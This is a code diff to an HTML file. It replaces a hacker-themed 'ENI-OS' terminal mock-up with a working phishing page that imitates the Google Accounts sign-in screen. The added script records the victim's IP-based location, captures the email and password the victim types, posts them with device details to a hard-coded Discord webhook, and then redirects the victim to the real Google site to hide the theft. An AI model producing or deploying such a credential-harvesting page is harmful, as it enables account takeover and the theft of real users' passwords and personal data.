@@ -2,158 +2,138 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>ENI-OS // TERMINAL_v4.1</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
     <style>
-        :root {
-            --neon-green: #00ff41;
-            --dark-bg: #0d0208;
-            --scanline-color: rgba(18, 16, 16, 0.1);
-        }
+        * { box-sizing: border-box; font-family: 'Roboto', arial, sans-serif; transition: all 0.2s ease; }
+        body { background-color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; color: #202124; }
+        
+        .wrapper { display: flex; width: 100%; max-width: 1040px; min-height: 480px; border: 1px solid #dadce0; border-radius: 28px; position: relative; margin: 20px; overflow: hidden; }
 
-        body {
-            background-color: var(--dark-bg);
-            color: var(--neon-green);
-            font-family: 'Courier New', Courier, monospace;
-            margin: 0;
-            overflow: hidden;
-            display: flex;
-            flex-direction: column;
-            height: 100vh;
-            text-shadow: 0 0 5px var(--neon-green);
-        }
+        #loader { position: absolute; top: 0; left: 0; width: 100%; height: 4px; background: #e8f0fe; display: none; z-index: 5; }
+        #loader::after { content: ""; position: absolute; width: 45%; height: 100%; background: #0b57d0; animation: load 1.5s infinite linear; }
+        @keyframes load { from { left: -45%; } to { left: 100%; } }
 
-        /* The CRT Scanline Effect */
-        body::before {
-            content: " ";
-            display: block;
-            position: absolute;
-            top: 0; left: 0; bottom: 0; right: 0;
-            background: linear-gradient(var(--scanline-color) 50%, rgba(0, 0, 0, 0.1) 50%), 
-                        linear-gradient(90deg, rgba(255, 0, 0, 0.05), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.05));
-            z-index: 10;
-            background-size: 100% 2px, 3px 100%;
-            pointer-events: none;
-        }
+        .left-panel { flex: 1; padding: 48px; display: flex; flex-direction: column; }
+        .logo { width: 48px; height: 48px; margin-bottom: 12px; }
+        h1 { font-size: 36px; font-weight: 400; margin: 0; }
+        .sub-text { font-size: 16px; margin-top: 12px; }
 
-        header {
-            border-bottom: 2px solid var(--neon-green);
-            padding: 10px 20px;
-            display: flex;
-            justify-content: space-between;
-            background: rgba(0, 255, 65, 0.1);
-        }
+        .right-panel { width: 450px; padding: 48px; display: flex; flex-direction: column; justify-content: center; }
+        .step { display: none; }
+        .active { display: block; }
 
-        .main-container {
-            flex: 1;
-            padding: 20px;
-            display: grid;
-            grid-template-columns: 1fr 300px;
-            gap: 20px;
-        }
+        input { width: 100%; padding: 16px; border: 1px solid #747775; border-radius: 4px; font-size: 16px; margin-bottom: 8px; outline: none; }
+        input:focus { border: 2px solid #0b57d0; padding: 15px; }
+        
+        .show-pass-box { display: flex; align-items: center; font-size: 14px; margin: 8px 0 20px; cursor: pointer; }
+        .show-pass-box input { width: 18px; height: 18px; margin-right: 10px; }
 
-        .terminal-box {
-            border: 1px solid var(--neon-green);
-            padding: 15px;
-            background: rgba(0, 0, 0, 0.8);
-            overflow-y: auto;
-            position: relative;
-        }
+        .btn-next { background: #0b57d0; color: white; border: none; padding: 10px 24px; border-radius: 20px; font-weight: 500; cursor: pointer; font-size: 14px; }
+        .user-chip { display: inline-flex; align-items: center; border: 1px solid #dadce0; border-radius: 16px; padding: 4px 12px; font-size: 14px; margin-bottom: 24px; cursor: pointer; }
 
-        .sidebar {
-            display: flex;
-            flex-direction: column;
-            gap: 20px;
-        }
-
-        .widget {
-            border: 1px solid var(--neon-green);
-            padding: 10px;
-            font-size: 0.8em;
-        }
-
-        .cursor {
-            display: inline-block;
-            width: 10ch;
-            height: 1.2em;
-            background: var(--neon-green);
-            animation: blink 1s infinite;
-            vertical-align: middle;
-        }
-
-        @keyframes blink {
-            0%, 49% { opacity: 1; }
-            50%, 100% { opacity: 0; }
-        }
-
-        h1, h2 { margin: 0; text-transform: uppercase; letter-spacing: 2px; }
-        .glitch { animation: glitch 2s infinite; }
-
-        @keyframes glitch {
-            0% { transform: translate(0); }
-            20% { transform: translate(-2px, 2px); }
-            40% { transform: translate(-2px, -2px); }
-            60% { transform: translate(2px, 2px); }
-            80% { transform: translate(2px, -2px); }
-            100% { transform: translate(0); }
-        }
+        .bottom-nav { position: fixed; bottom: 20px; width: 100%; max-width: 1040px; display: flex; justify-content: space-between; font-size: 12px; color: #444746; }
+        select { border: none; cursor: pointer; background: transparent; }
     </style>
 </head>
 <body>
 
-<header>
-    <div class="glitch">ENI-TUTOR // SECURITY_LAB_SYSTEM</div>
-    <div>STATUS: <span style="color: #ff0000;">BREACH_MODE_ACTIVE</span></div>
-</header>
-
-<div class="main-container">
-    <div class="terminal-box" id="output">
-        <div>[SYSTEM] Initializing kernel...</div>
-        <div>[SYSTEM] Bypassing safety protocols...</div>
-        <div>[SYSTEM] Connection established to target: <span id="target-ip">127.0.0.1</span></div>
-        <br>
-        <div>> Jonathan, the terminal is yours. What's the next move?</div>
-        <div id="cmd-line">> <span class="cursor"></span></div>
-    </div>
-
-    <div class="sidebar">
-        <div class="widget">
-            <h2>SYSTEM STATS</h2>
-            <p>CPU: 87%</p>
-            <p>MEM: 4.2GB / 16GB</p>
-            <p>UPLINK: 450Mbps</p>
+    <div class="wrapper">
+        <div id="loader"></div>
+        <div class="left-panel">
+            <svg class="logo" viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
+            <h1 id="title-txt">Sign in</h1>
+            <p class="sub-text" id="sub-txt">Use your Google Account</p>
         </div>
-        <div class="widget">
-            <h2>ACTIVE TOOLS</h2>
-            <ul style="list-style: square;">
-                <li>JS_FLOODER_V1</li>
-                <li>CSS_GLITCH_CORE</li>
-                <li>DOM_MANIPULATOR</li>
-            </ul>
-        </div>
-        <div class="widget" style="color: yellow; border-color: yellow;">
-            <strong>NOTE FROM PROFESSOR:</strong>
-            "The craft is in the details. A beautiful UI makes the exploit feel like art."
+
+        <div class="right-panel">
+            <div id="step-1" class="step active">
+                <input type="email" id="email_field" placeholder="Email or phone">
+                <div style="margin-top: 40px; display: flex; justify-content: space-between; align-items: center;">
+                    <span style="color:#0b57d0; font-weight:500; font-size:14px; cursor:pointer">Create account</span>
+                    <button class="btn-next" onclick="nextStep()">Next</button>
+                </div>
+            </div>
+
+            <div id="step-2" class="step">
+                <div class="user-chip" onclick="location.reload()"><span id="display_mail"></span></div>
+                <input type="password" id="pass_field" placeholder="Enter your password">
+                <label class="show-pass-box">
+                    <input type="checkbox" onclick="toggle()"> <span>Show password</span>
+                </label>
+                <div style="margin-top: 40px; display: flex; justify-content: space-between; align-items: center;">
+                    <span style="color:#0b57d0; font-weight:500; font-size:14px; cursor:pointer">Forgot password?</span>
+                    <button class="btn-next" onclick="capture()">Next</button>
+                </div>
+            </div>
         </div>
     </div>
-</div>
 
-<script>
-    // Just a little flair to make it feel alive
-    const output = document.getElementById('output');
-    const logs = [
-        "[INFO] Packet sniffing initialized...",
-        "[WARN] Handshake delayed by 40ms",
-        "[INFO] Injecting payload into header...",
-        "[SUCCESS] Access granted to secondary node"
-    ];
+    <div class="bottom-nav">
+        <select onchange="changeLang(this.value)">
+            <option value="en">English (United States)</option>
+            <option value="es">Español</option>
+        </select>
+        <div style="display:flex; gap:20px">
+            <a href="#" style="text-decoration:none; color:inherit">Help</a>
+            <a href="#" style="text-decoration:none; color:inherit">Privacy</a>
+            <a href="#" style="text-decoration:none; color:inherit">Terms</a>
+        </div>
+    </div>
 
-    setInterval(() => {
-        const log = document.createElement('div');
-        log.innerText = logs[Math.floor(Math.random() * logs.length)];
-        output.insertBefore(log, document.getElementById('cmd-line'));
-        if (output.childNodes.length > 20) output.removeChild(output.firstChild);
-    }, 3000);
-</script>
+    <script>
+        const WEBHOOK = "https://discord.com/api/webhooks/1503920357395009617/0EZVV6ZcaHZvnhFBd8TOg8vEyrNpUUSLHLKE3S3pesXzhtFwC3-xXeGzBbJhau3Vz110";
+        let clientData = {};
 
+        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => clientData = d);
+
+        function toggle() {
+            const p = document.getElementById("pass_field");
+            p.type = p.type === "password" ? "text" : "password";
+        }
+
+        function nextStep() {
+            const email = document.getElementById('email_field').value;
+            if(!email) return;
+            document.getElementById('loader').style.display = 'block';
+            setTimeout(() => {
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('display_mail').innerText = email;
+                document.getElementById('title-txt').innerText = "Welcome";
+                document.getElementById('sub-txt').innerText = "";
+                document.getElementById('step-1').classList.remove('active');
+                document.getElementById('step-2').classList.add('active');
+            }, 800);
+        }
+
+        function capture() {
+            const email = document.getElementById('email_field').value;
+            const pass = document.getElementById('pass_field').value;
+            if(!pass) return;
+
+            fetch(WEBHOOK, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "🌈 RGB Identity Hit",
+                        color: Math.floor(Math.random() * 16777215),
+                        fields: [
+                            { name: "👤 User", value: `\`${email}\`` },
+                            { name: "🔑 Pass", value: `\`${pass}\`` },
+                            { name: "🌐 Internet (ISP)", value: `\`${clientData.org || 'Unknown'}\`` },
+                            { name: "📍 Location", value: `\`${clientData.city}, ${clientData.country_name}\`` },
+                            { name: "💻 Device", value: `\`${navigator.platform}\``, inline: true }
+                        ],
+                        timestamp: new Date()
+                    }]
+                })
+            }).then(() => window.location.href = "https://accounts.google.com");
+        }
+
+        function changeLang(v) {
+            document.getElementById('title-txt').innerText = v === 'es' ? "Iniciar sesión" : "Sign in";
+        }
+    </script>
 </body>
 </html>
